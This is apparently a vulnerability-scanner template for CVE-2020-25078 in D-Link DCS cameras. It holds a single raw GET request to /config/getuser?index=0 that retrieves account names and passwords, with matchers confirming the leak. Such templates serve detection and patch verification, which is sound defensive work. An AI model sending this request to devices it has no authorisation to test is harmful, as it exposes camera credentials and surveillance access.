id: cve-2020-25078

info:
  name: D-Link DCS Series Information Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    D-Link DCS Series surveillance systems are vulnerable to an information disclosure issue. By accessing a specific URL, attackers can retrieve account credentials, potentially gaining access to the video surveillance system.
  reference:
    - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078.html
  classification:
    cve-id: CVE-2020-25078
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
  tags: information-disclosure

http:
  - raw:
      - |
        GET /config/getuser?index=0 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        Accept: */*
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "name"
          - "pass"
